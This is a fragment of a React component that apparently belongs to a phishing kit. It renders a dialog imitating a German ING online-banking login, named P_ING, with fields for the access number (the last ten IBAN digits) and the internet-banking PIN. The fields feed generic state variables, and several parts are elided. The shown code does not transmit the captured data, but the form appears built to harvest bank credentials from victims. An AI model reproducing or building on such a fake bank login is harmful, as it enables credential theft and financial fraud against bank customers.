...
export const P_ING = ({ handleBankOpen, children }) => {
      ...
      <Dialog open={isOpen}>
        <div>
          <CONT>
            ...
            >
              <WARN>
                <div>Anmelden mit Zugangsdaten</div>
              </WARN>
              <SIDES>
                <Label>
                  <span>Zugangsnummer</span>
                  <INPUT onChange={handleData_1} value={data.data1} />
                </Label>
                <Label_BOTTOM>
                  <div />
                  <p>Letzte 10 Stellen Ihrer IBAN / Depotnummer</p>
                </Label_BOTTOM>
                <Label>
                  <span>Internetbanking PIN</span>
                  <INPUT onChange={handleData_2} value={data.data2} />
                </Label>
                <Label_BOTTOM>
                  <div />
                  <p>Bitte beachten Sie die Groß- und Kleinschreibung.</p>
                </Label_BOTTOM>
